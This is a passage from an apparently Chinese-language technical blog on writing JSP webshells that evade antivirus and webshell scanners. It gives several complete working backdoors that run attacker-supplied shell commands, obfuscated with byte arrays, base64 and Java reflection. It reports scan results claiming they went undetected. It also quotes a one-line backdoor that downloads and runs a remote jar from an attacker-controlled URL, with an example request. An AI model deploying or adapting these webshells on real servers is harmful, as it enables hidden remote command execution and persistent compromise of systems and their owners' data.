<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ %&gt;    页面指令，设定页面属性和特征信息</span><br><span class="line">&lt;% %&gt;     java代码片段，不能在此声明方法</span><br><span class="line">&lt;%! %&gt;    java代码声明，声明全局变量或当前页面的方法</span><br><span class="line">&lt;%= %&gt;    Java表达式</span><br></pre></td></tr></table></figure>

<h3 id="0x03：用ProcessBuilder绕过检测"><a href="#0x03：用ProcessBuilder绕过检测" class="headerlink" title="0x03：用ProcessBuilder绕过检测"></a>0x03：用ProcessBuilder绕过检测</h3><p>先看一个简单原始的执行系统命令的后门：</p>
<p><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</code></p>
<p>接收请求参数<strong>i</strong>传递的命令字符串，然后使用Runtime对象的exec()方法执行该命令。特点是命令无回显，会被杀。</p>
<p>“Runtime”、”exec”字符串过于显眼，基本都会被查杀软件检测到。所以，可以使用ProcessBuilder类建立一个不那么轻易被杀的命令执行后门，命名为<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/jsp/ProcessBuilder-cmd.jsp" target="_blank" rel="noopener">ProcessBuilder-cmd.jsp</a>：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">"POST"</span> NAME=<span class="string">"form"</span> ACTION=<span class="string">"#"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"q"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"submit"</span> VALUE=<span class="string">"Fly"</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String op=<span class="string">"Got Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">    Boolean isWin;</span><br><span class="line">    <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">        isWin = <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        isWin = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ProcessBuilder pb;</span><br><span class="line">        <span class="keyword">if</span>(isWin) &#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">67</span>&#125;), query);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">45</span>, <span class="number">99</span>&#125;), query);</span><br><span class="line">        &#125;</span><br><span class="line">        Process process = pb.start();</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(process.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;PRE&gt;</span><br><span class="line">    &lt;%= op %&gt;&gt;</span><br><span class="line">&lt;/PRE&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>

<p>执行命令：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjd7t2gj30cx061t9h.jpg" alt="利用ProcessBuilder来执行命令"></p>
<p>上述代码做的几点绕过检测的考虑：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 避免出现敏感变量名</span><br><span class="line">   如&quot;cmd&quot;、&quot;spy&quot;、&quot;exec&quot;、&quot;shell&quot;、&quot;execute&quot;、&quot;system&quot;、&quot;command&quot;等等</span><br><span class="line">2. 字符串拆解重组</span><br><span class="line">   将&quot;cmd&quot;、&quot;&#x2F;c&quot;和&quot;&#x2F;bin&#x2F;bash&quot;、&quot;-c&quot;等都做了处理，由字节转为字符串</span><br><span class="line">3. 使用Scanner接收回显</span><br><span class="line">   接收命令回显数据时，避免使用BufferedReader等常见手段</span><br><span class="line">4. 用fileSeparator来判断操作系统类型</span><br><span class="line">   一般使用System.getProperty&#x2F;getProperties获取操作系统的类型，这里使用路径分隔符简单判断，然后再选用&quot;cmd &#x2F;c&quot;或者&quot;&#x2F;bin&#x2F;bash -c&quot;来执行命令</span><br><span class="line">5. 不导入过多的包</span><br></pre></td></tr></table></figure>

<p>虽然做的绕过考虑不多，还<strong>带有ProcessBuilder关键字</strong>，但还是没被以下软件和平台检测出来：</p>
<p><strong>virustotal检测</strong>：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjg0v0tj30qk0gpgmz.jpg" alt="virustotal检测结果"></p>
<p><strong>shellpub.com检测：</strong></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjid574j30rb09rmxj.jpg" alt="shellpub.com检测结果"></p>
<p><strong>D盾、安全狗、深信服Webshell扫描检测：</strong>只有故意放置的一个简单exec后门被查出来</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjl9lolj30oz0db41f.jpg" alt="本地软件检测结果"></p>
<p><strong>OpenRASP团队 <a href="https://scanner.baidu.com" target="_blank" rel="noopener">https://scanner.baidu.com</a> 检测</strong>结果(引擎版本: 2018-0509-1000)：没有发现异常</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjqsy99j310j079n68.jpg" alt="scanner.baidu.com检测"></p>
<h3 id="0x04：使用Java反射机制绕过检测"><a href="#0x04：使用Java反射机制绕过检测" class="headerlink" title="0x04：使用Java反射机制绕过检测"></a>0x04：使用Java反射机制绕过检测</h3><p>  Runtime类的exec方法在Webshell中用的多了，极易被后门查杀软件检测到，那么就不能用exec函数来执行系统命令了嘛？不然，还可以使用Java反射技术既绕过软件对”Runtime”、”exec”等关键词的检查又使用exec函数来执行系统命令。</p>
<p>在运行时，对于一个类，能够获取这个类的所有属性和方法，对于一个对象，都能够调用它的任意一个方法和属性，这种动态获取信息和动态调用对象方法的功能称为java语言的反射机制。Java反射机制的来龙去脉比较复杂，这里再给出一段简介用来参考：</p>
<blockquote>
<p>Java Reflection makes it possible to inspect classes, interfaces, fields and methods at runtime, without knowing the names of the classes, methods etc. at compile time. It is also possible to instantiate new objects, invoke methods and get/set field values using reflection.</p>
</blockquote>
<h4 id="一-反射Runtime"><a href="#一-反射Runtime" class="headerlink" title="一. 反射Runtime"></a>一. 反射Runtime</h4><p>通过查阅<a href="http://tutorials.jenkov.com/java-reflection/index.html" target="_blank" rel="noopener">资料</a>，可写出利用反射机制调用Runtime类exec方法执行系统命令的一段示例代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String op = <span class="string">""</span>;</span><br><span class="line">Class rt = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">Method gr = rt.getMethod(<span class="string">"getRuntime"</span>);</span><br><span class="line">Method ex = rt.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">Process e = (Process) ex.invoke(gr.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;),  <span class="string">"cmd /c ping www.baidu.com"</span>);</span><br><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(e.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">sc.close();</span><br><span class="line">System.out.print(op);</span><br></pre></td></tr></table></figure>

<p>具体代码含义不浪费篇幅解释了，讲下代码的主要逻辑：</p>
<ol>
<li>获取Runtime类的Class对象</li>
<li>分别获取Runtime类Class对象的getRuntime方法和exec方法的Method对象</li>
<li>利用getRuntime方法的Method对象，进行invoke调用，获得Runtime对象实例</li>
<li>利用exec方法的Method对象，进行invoke调用，执行系统命令</li>
<li>获取命令执行输出并打印</li>
</ol>
<p>基于以上代码，然后就可以轻松创造出一个使用Java反射技术，既调用Runtime类exec函数执行系统命令， 又可以免杀的JSP后门了，命名为：<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/jsp/Runtime-reflect-cmd.jsp" target="_blank" rel="noopener">Runtime-reflect-cmd.jsp</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> pageEncoding=<span class="string">"UTF-8"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line"></span><br><span class="line">&lt;FORM METHOD=POST ACTION=<span class="string">'#'</span>&gt;</span><br><span class="line">    &lt;INPUT name=<span class="string">'q'</span> type=text&gt;</span><br><span class="line">    &lt;INPUT type=submit value=<span class="string">'Fly'</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getPicture</span><span class="params">(String str)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">        <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">            str = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">32</span>&#125;) + str;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            str =  <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">99</span>, <span class="number">32</span>&#125;) + str;</span><br><span class="line">        &#125;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null, new Object[]&#123;&#125;),  new Object[] &#123; str &#125;);</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(e.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        String result = <span class="string">""</span>;</span><br><span class="line">        result = sc.hasNext() ? sc.next() : result;</span><br><span class="line">        sc.close();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String name =<span class="string">"Input Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    <span class="keyword">if</span>(query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        name = getPicture(query);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%= name %&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>

<p>在Runtime-reflect-cmd.jsp 脚本中：&lt;%! %&gt;标签里声明了用来执行系统命令的getPicture方法，&lt;% %&gt;标签里接受输入的命令，调用了getPicture方法，执行命令并返回结果&lt;%= %&gt;标签里输出系统命令执行结果到网页的&lt;pre&gt;标签对中。</p>
<h4 id="二-反射ProcessBuilder"><a href="#二-反射ProcessBuilder" class="headerlink" title="二. 反射ProcessBuilder"></a>二. 反射ProcessBuilder</h4><p>查找资料，可以发现已有使用过Runtime反射后门的代码。那么既然可以反射Runtime，其实也可以构造出利用ProcessBuilder类start函数的jsp反射后门。</p>
<p>以下后门代码命名为<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/jsp/ProcessBuilder-reflect-cmd.jsp" target="_blank" rel="noopener">ProcessBuilder-reflect-cmd.jsp</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=<span class="string">"UTF-8"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.List"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.ArrayList"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"sun.misc.BASE64Encoder"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"sun.misc.BASE64Decoder"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line"></span><br><span class="line">&lt;FORM METHOD=POST ACTION=<span class="string">'#'</span>&gt;</span><br><span class="line">    &lt;INPUT name=<span class="string">'q'</span> type=text&gt;</span><br><span class="line">    &lt;INPUT type=submit value=<span class="string">'Fly'</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getPicture</span><span class="params">(String str)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        BASE64Decoder decoder = <span class="keyword">new</span> BASE64Decoder();</span><br><span class="line">        BASE64Encoder encoder = <span class="keyword">new</span> BASE64Encoder();</span><br><span class="line">        String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">        <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"Y21k"</span>)));</span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"L2M="</span>)));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"L2Jpbi9iYXNo"</span>)));</span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"LWM="</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(str)));</span><br><span class="line">        Class PB = Class.forName(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVy"</span>)));</span><br><span class="line">        Process s = (Process) PB.getMethod(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"c3RhcnQ="</span>))).invoke(PB.getDeclaredConstructors()[<span class="number">0</span>].newInstance(list));</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(s.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        String result = <span class="string">""</span>;</span><br><span class="line">        result = sc.hasNext() ? sc.next() : result;</span><br><span class="line">        sc.close();</span><br><span class="line">        <span class="keyword">return</span> encoder.encode(result.getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String name =<span class="string">"Input Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    <span class="keyword">if</span>(query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        name = getPicture(query);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%= name %&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>

<p>ProcessBuilder-reflect-cmd.jsp脚本中，考虑到通用性、隐蔽性和对抗网页流量内容检测，用sun.misc包中的base64编码函数来处理了相关变量和内容。命令需要base64编码一下再提交，最后输出的内容需要base64解码：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjv50w8j30dz060gmc.jpg" alt="ProcessBuilder反射后门"></p>
<p>其中关键的两行反射代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class PB = Class.forName(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVy"</span>)));</span><br><span class="line">Process s = (Process) PB.getMethod(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"c3RhcnQ="</span>))).invoke(PB.getDeclaredConstructors()[<span class="number">0</span>].newInstance(list));</span><br></pre></td></tr></table></figure>

<p>为了易于理解可以写成下面的示例代码供参考：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 获取ProcessBuilder的Class对象,PB</span></span><br><span class="line">Class PB = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line"><span class="comment">// 2. 从PB获取接受一个List类型变量作为参数的构造器对象,constructor</span></span><br><span class="line">Constructor constructor = PB.getConstructor(<span class="keyword">new</span> Class[]&#123;List<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">或</span><br><span class="line"><span class="comment">// 获得PB的第一个(也只有一个)构造器对象</span></span><br><span class="line">Constructor constructor = PB.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 3. 从PB获取一个名叫"start"的方法对象,m</span></span><br><span class="line">Method m = PB.getMethod(<span class="string">"start"</span>);</span><br><span class="line"><span class="comment">// 4. 提供给constructor需要的List类型变量值list(其中包含我们需要执行的命令)，获得一个实例对象obj</span></span><br><span class="line">Object obj = constructor.newInstance(list);</span><br><span class="line"><span class="comment">//5. 传入obj对象，调用m("start"方法)，执行系统命令</span></span><br><span class="line">Process process = (Process) m.invoke(obj);</span><br></pre></td></tr></table></figure>

<h4 id="三-关于反射ProcessImpl"><a href="#三-关于反射ProcessImpl" class="headerlink" title="三. 关于反射ProcessImpl"></a>三. 关于反射ProcessImpl</h4><p>在”<strong>0x01：Java执行系统命令的方法和原理</strong>“部分讲了，ProcessImpl类不是public修饰的，不能从java.lang包外的地方直接访问。所以想要接触到ProcessImpl.start方法就要用到反射机制(需要setAccessible true)，反射最原始的ProcessImpl类的start方法，来执行系统命令。</p>
<p>用代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">Class Pi = Class.forName(<span class="string">"java.lang.ProcessImpl"</span>);</span><br><span class="line">Method[] methods = Pi.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:methods)&#123;</span><br><span class="line">    m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    System.out.println(m.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以获得ProcessImpl.start方法的参数原型(JDK8)：</p>
<p><code>static java.lang.Process java.lang.ProcessImpl.start(java.lang.String[],java.util.Map,java.lang.String,java.lang.ProcessBuilder$Redirect[],boolean) throws java.io.IOException</code></p>
<p>或者跟踪到ProcessImpl类中，也可以直接观察需要的5个参数值类型：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjyrjosj30d204wq34.jpg" alt="ProcessImpl start函数构造"></p>
<p>经<a href="https://github.com/0c0c0f" target="_blank" rel="noopener">@0c0c0f</a> 提醒， 其实反射java.lang.ProcessImpl类来执行代码，看起来要传入5个参数，实现起来其实也不复杂，完整代码示例如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.ProcessBuilder.Redirect;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">invoke_ProcessImpl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String op = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        String dir = <span class="string">"."</span>;</span><br><span class="line">        String[] cmdarray = <span class="keyword">new</span> String[]&#123;<span class="string">"ping"</span>, <span class="string">"127.0.0.1"</span>&#125;;</span><br><span class="line">        Map&lt;String, String&gt; environment = <span class="keyword">null</span>;</span><br><span class="line">        Redirect[] redirects = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">boolean</span> redirectErrorStream = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"java.lang.ProcessImpl"</span>);</span><br><span class="line">        Method method = clazz.getDeclaredMethod("start", String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Process e = (Process) method.invoke(<span class="keyword">null</span>, cmdarray, environment, dir, redirects, redirectErrorStream);</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(e.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">        sc.close();</span><br><span class="line">        System.out.print(op);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中虽然成功通过反射 java.lang.ProcessImpl 类的start方法执行了系统命令，但引入了”ProcessBuilder” 关键字，所以只作为一种技术可行性来看待。在jdk6及以下版本，ProcessImpl start函数只需四个参数，可以避免引入”ProcessBuilder”关键字，通过反射执行系统命令。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetk1v4hsj31me0k0q9y.jpg" alt="ProcessImpl jdk6 start函数构造"></p>
<p>总之，想要通过Java反射机制来执行系统命令的话，一般就是通过<strong>反射Runtime类和ProcessBuilder类</strong>，调用相关系统命令执行方法来完成。</p>
<p>其实到这里，利用Java的反射机制来绕过查杀软件检测已经讲的差不多了。但是查资料过程中，发现下面这段比较老的利用Java反射技术的后门代码：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%=Class.forName(<span class="string">"Load"</span>,<span class="keyword">true</span>,<span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> java.net.URL[]&#123;<span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">"u"</span>))&#125;)).getMethods()[<span class="number">0</span>].invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;request.getParameterMap()&#125;)%&gt;</span><br></pre></td></tr></table></figure>

<p>利用起来像这样</p>
<p><code>http://target.com/reflect.jsp?u=http://somesite.com/some.jar&amp;password=A</code></p>
<p>仔细看会发现：代码中的Class.forName()方法用了三个参数，而我们上面部分讲的代码中Class.forName()方法只用了一个参数。查阅API文档，发现Class.forName()方法是有两种形式，然后就注意到了Java类加载器ClassLoader和类加载机制。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetk3e540j30lo09cq3n.jpg" alt="Class.forName"></p>
<h3 id="0x05：使用Java类加载机制绕过检测"><a href="#0x05：使用Java类加载机制绕过检测" class="headerlink" title="0x05：使用Java类加载机制绕过检测"></a>0x05：使用Java类加载机制绕过检测</h3><p>Java类加载机制简单来说就是JVM查找到类的所在位置，并将找到的Java类的字节码装入内存，生成对应的Class对象。其中有几个重要的概念如下：</p>
<h4 id="Class对象"><a href="#Class对象" class="headerlink" title="Class对象"></a>Class对象</h4><blockquote>
<p>一个.java源码文件经过编译生成.class字节码文件，可以认为是Java编译器创建了一个可以被JVM识别并加载的Class对象。这个Class对象就可以看成是.class文件或者说Class对象被保存在了.class文件中。</p>
</blockquote>
<h4 id="Java自带的三个类加载器"><a href="#Java自带的三个类加载器" class="headerlink" title="Java自带的三个类加载器"></a>Java自带的三个类加载器</h4><ul>
<li>Bootstrap Classloder </li>
<li>Extention ClassLoader</li>
<li>App ClassLoader</li>
</ul>
<p>上一级称为下一级的父加载器，加载的先后顺序依次是：</p>
<p><code>Bootstrap Classloder =&gt; Extention ClassLoader =&gt; App ClassLoader</code></p>
<p>对应的System.getProperty路径查找顺序：</p>
<p><code>sun.boot.class.path =&gt; java.ext.dirs =&gt; java.class.path</code></p>
<p>借用别人的一张图(<strong>双亲委托</strong>)简单说明类加载的过程：</p>
<blockquote>
<p>一个类加载器查找class和resource时，首先判断这个class是不是已经加载成功；如果没有的话它并不是自己进行查找，而是先委托给父加载器，然后递归委托，直到Bootstrap ClassLoader加载器；如果Bootstrap classloader找到了，直接返回class和resource；如果没有找到，则一级一级返回，最后才是自己去查找。</p>
</blockquote>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetk5sfknj30fa0hdach.jpg" alt="类加载"></p>
<p>原理看起来比较复杂，实现起来其实比较简单，即将获得Class对象的方式由</p>
<p><code>Class rt= Class.forName(&quot;java.lang.Runtime&quot;);</code> 改成</p>
<p> <code>Class rt = ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;);</code>的形式即可，反射ProcessBuilder同理。</p>
<p>其它一些特性如要深入了解请去查看具体代码实现，其它内容不再展开。</p>
<h3 id="0x06：获得Class对象的四种方法"><a href="#0x06：获得Class对象的四种方法" class="headerlink" title="0x06：获得Class对象的四种方法"></a>0x06：获得Class对象的四种方法</h3><p>在以上文章中，其实我们大部分篇幅都是围绕着Java语言中获得Class对象的四种方法，构造绕过检测软件的执行系统命令的后门的。Java语言中获得Class对象的主要有以下四种方法：</p>
<h5 id="原生类-class"><a href="#原生类-class" class="headerlink" title="原生类.class"></a>原生类.class</h5><p>即通过类、枚举、接口、注解或数组类型的原生类型名称.class，来获得Class对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class c = java.lang.Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br></pre></td></tr></table></figure>

<h5 id="对象-getClass"><a href="#对象-getClass" class="headerlink" title="对象.getClass()"></a>对象.getClass()</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.Runtime obj = java.lang.Runtime.getRuntime();</span><br><span class="line">Class c = obj.getClass();</span><br></pre></td></tr></table></figure>

<h5 id="使用-Class-forName"><a href="#使用-Class-forName" class="headerlink" title="使用 Class.forName()"></a>使用 Class.forName()</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class c= Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">或</span><br><span class="line">Class c = Class.forName(<span class="string">"java.lang.Runtime"</span>,<span class="keyword">false</span>,ClassLoader.getSystemClassLoader());</span><br></pre></td></tr></table></figure>

<h5 id="使用-ClassLoader"><a href="#使用-ClassLoader" class="headerlink" title="使用 ClassLoader"></a>使用 ClassLoader</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class c = ClassLoader.getSystemClassLoader().loadClass(<span class="string">"java.lang.Runtime"</span>);</span><br></pre></td></tr></table></figure>

